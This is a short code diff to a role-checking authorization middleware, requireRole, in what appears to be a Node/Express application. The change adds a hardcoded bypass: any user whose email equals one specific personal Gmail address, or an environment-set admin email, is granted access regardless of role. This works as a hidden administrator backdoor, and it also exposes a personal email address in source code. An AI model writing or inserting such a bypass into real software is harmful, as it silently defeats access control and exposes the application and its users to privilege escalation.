@@ -406,14 +406,18 @@ function requireRole(allowedRoles = ['admin', 'super_admin']) {
         code: 'UNAUTHORIZED'
       });
     }
-    if (!roles.includes(req.user.role)) {
-      return res.status(403).json({
-        success: false,
-        error: 'Forbidden: Insufficient role permissions.',
-        code: 'FORBIDDEN_ROLE'
-      });
+    const isSuperAdmin = req.user.email && (
+      req.user.email.toLowerCase() === 'susantalohr@gmail.com' ||
+      (process.env.ADMIN_EMAIL && req.user.email.toLowerCase() === process.env.ADMIN_EMAIL.toLowerCase())
+    );
+    if (isSuperAdmin || roles.includes(req.user.role)) {
+      return next();
     }
-    return next();
+    return res.status(403).json({
+      success: false,
+      error: 'Forbidden: Insufficient role permissions.',
+      code: 'FORBIDDEN_ROLE'
+    });
   };
 }
 
